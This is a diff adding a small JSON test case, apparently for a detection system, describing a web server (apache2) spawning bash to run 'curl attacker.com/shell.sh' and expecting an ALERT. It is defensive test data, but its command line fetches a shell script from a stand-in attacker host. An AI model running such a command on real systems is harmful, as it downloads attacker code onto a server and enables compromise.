@@ -1,0 +1,14 @@
+{
+"ParentImage":"apache2",
+
+"Image":"/bin/bash",
+
+"CommandLine":
+"bash -c curl attacker.com/shell.sh",
+
+"Scenario":
+"Compromised web server executing attacker shell",
+
+"Expected":
+"ALERT"
+}
